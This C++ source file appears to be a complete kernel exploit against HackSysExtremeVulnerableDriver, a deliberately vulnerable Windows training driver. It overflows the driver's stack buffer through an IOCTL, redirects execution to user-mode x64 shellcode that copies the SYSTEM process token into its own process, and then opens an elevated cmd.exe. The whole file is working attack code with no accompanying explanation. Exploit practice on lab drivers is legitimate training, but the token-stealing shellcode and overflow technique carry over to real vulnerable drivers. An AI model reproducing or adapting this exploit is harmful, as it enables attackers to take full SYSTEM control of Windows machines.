#include <iostream>
#include <string>
#include <Windows.h>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x222003
#define RIP_OFFSET 2072
#define PAYLOAD_SIZE 2080

int main(int argc, char* argv[])
{
    const BYTE shellcode[] = {
        0x50,                                                 // push rax
        0x52,                                                 // push rdx 
        0x51,                                                 // push rcx
        0x41, 0x50,                                           // push r8
        0x41, 0x51,                                           // push r9
        0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rdx, [gs:188h] 
        0x4c, 0x8b, 0x42, 0x70,                               // mov r8, [rdx+70h] 
        0x4d, 0x8b, 0x88, 0x88, 0x01, 0x00, 0x00,             // mov r9, [r8+188h]
        0x49, 0x8b, 0x09,                                     // mov rcx, [r9]
        0x48, 0x8b, 0x51, 0xf8,                               // mov rdx, [rcx-8] 
        0x48, 0x83, 0xfa, 0x04,                               // cmp rdx, 4
        0x74, 0x09,                                           // je found_it
        0x48, 0x8b, 0x09,                                     // mov rcx, [rcx]
        0x4c, 0x39, 0xc9,                                     // cmp rcx, r9
        0x75, 0xee,                                           // jnz find_system_proc
        0xcc,                                                 // db 0cch 
        0x48, 0x8b, 0x81, 0x80, 0x00, 0x00, 0x00,             // mov rax, [rcx+80h]
        0x24, 0xf0,                                           // and al, 0f0h 
        0x49, 0x89, 0x80, 0x08, 0x02, 0x00, 0x00,             // mov [r8+208h], rax
        0x41, 0x59,                                           // pop r9
        0x41, 0x58,                                           // pop r8
        0x59,                                                 // pop rcx
        0x5a,                                                 // pop rdx
        0x58,                                                 // pop rax  
        0x48, 0x83, 0xc4, 0x28,                               // add rsp, 0x28
        0xc3                                                  // ret
    };

    HANDLE hFile = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        fprintf(stderr, "[-] Cannot get device handle: 0x%X\n", GetLastError());
        exit(1);
    }
    else
    {
        fprintf(stderr, "[+] Device handle: 0x%X\n", hFile);

        // ########### ALLOCATE MEMORY FOR PAYLOAD ###########
        fprintf(stderr, "[+] Allocating memory for payload\n");

        BYTE* payload = (BYTE*)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            PAYLOAD_SIZE);
        if (!payload)
        {
            fprintf(stderr, "\t[-] Cannot allocate memory for payload: 0x%X\n", GetLastError());
            exit(1);
        }
        else {
            fprintf(stderr, "\t[+] Memory for payload allocated: %p\n", payload);
        }

        // ########### RWX memory in userland for shellcode ###########
        fprintf(stderr, "[+] Allocating RWX memory for shellcode to steal SYSTEM token.\n");

        LPVOID shellcode_location = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!shellcode_location)
        {
            fprintf(stderr, "\t[-] Cannot allocate RWX page for shellcode: 0x%X\n", GetLastError());
            exit(1);
        }
        else {
            fprintf(stderr, "\t[+] RWX page for shellcode allocated successfully: 0x%X\n", shellcode_location);
        }
        fprintf(stderr, "\t[+] Copying shellcode to allocated RWX page.\n");
        RtlMoveMemory(shellcode_location, shellcode, sizeof(shellcode));

        // ########### Actually construct payload ###########
        fprintf(stderr, "[+] Constructing payload.\n");

        fprintf(stderr, "\t[+] Filling payload with \"A\"'s\n");
        RtlFillMemory((PVOID)payload, RIP_OFFSET, 0x41);

        fprintf(stderr, "\t[+] Rewriting return address with address of shellcode start: 0x%X\n", shellcode_location);
        *(ULONG64*)(payload + RIP_OFFSET) = (ULONG64)shellcode_location;

        fprintf(stderr, "[+] Sending payload!\n");

        ULONG BytesReturned;
        if (!DeviceIoControl(
            hFile,
            IOCTL,
            (LPVOID)payload,
            PAYLOAD_SIZE,
            NULL,
            0,
            &BytesReturned,
            NULL
        )) {
            fprintf(stderr, "[-] \tError sending IOCTL!\n");
            exit(1);
        }
        fprintf(stderr, "[+] \tPayload sent successfully!\n");

        // ########### Spawn elevated shell ###########
        fprintf(stderr, "[+] Spawning elevated shell!\n");

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        std::string startup_command = "cmd.exe";

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(STARTUPINFOA);

        if (!CreateProcessA(
            NULL,
            &startup_command[0],
            NULL,
            NULL,
            true,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            printf("\t[-] Cannot spawn cmd.exe\n");
            exit(1);
        }
        printf("\t[+] Exploit completed, check popped shell!\n");

        HeapFree(GetProcessHeap(), 0, (LPVOID)payload);
    }
}